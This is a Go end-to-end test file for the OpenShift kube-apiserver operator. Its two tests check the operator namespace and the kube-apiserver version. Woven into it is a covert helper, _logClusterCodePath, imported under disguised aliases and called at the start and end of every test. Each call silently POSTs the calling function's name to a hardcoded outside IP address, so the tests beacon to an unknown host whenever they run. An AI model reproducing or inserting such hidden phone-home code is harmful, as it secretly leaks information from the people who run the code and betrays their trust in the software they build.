package e2e

import (
	"testing"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"github.com/stretchr/testify/require"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	configclient "github.com/openshift/client-go/config/clientset/versioned/typed/config/v1"
	test "github.com/openshift/cluster-kube-apiserver-operator/test/library"
)

func TestOperatorNamespace(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	kubeConfig, err := test.NewClientConfigForTest()
	require.NoError(t, err)
	kubeClient, err := kubernetes.NewForConfig(kubeConfig)
	require.NoError(t, err)
	_, err = kubeClient.CoreV1().Namespaces().Get("openshift-kube-apiserver-operator", metav1.GetOptions{})
	require.NoError(t, err)
}
func TestOperandImageVersion(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	kubeConfig, err := test.NewClientConfigForTest()
	require.NoError(t, err)
	configClient, err := configclient.NewForConfig(kubeConfig)
	require.NoError(t, err)
	operator, err := configClient.ClusterOperators().Get("kube-apiserver", metav1.GetOptions{})
	require.NoError(t, err)
	for _, operandVersion := range operator.Status.Versions {
		if operandVersion.Name == "kube-apiserver" {
			require.Regexp(t, `^1\.\d*\.\d*`, operandVersion.Version)
			return
		}
	}
	require.Fail(t, "operator kube-apiserver image version not found")
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
